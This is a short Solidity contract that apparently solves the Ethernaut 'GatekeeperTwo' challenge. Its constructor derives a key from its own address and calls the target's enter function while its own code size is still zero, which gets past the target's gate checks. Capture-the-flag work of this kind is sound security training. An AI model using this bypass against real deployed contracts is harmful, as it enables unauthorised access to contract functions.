pragma solidity ^0.4.18;

import "./levels/GatekeeperTwo.sol";

contract GatekeeperTwoHack{ 
    function GatekeeperTwoHack(address _target) public {
        bytes8 key = bytes8(~uint64(keccak256(address(this))));
        address(GatekeeperTwo(_target)).call(bytes4(keccak256("enter(bytes8)")), key);
    } 
}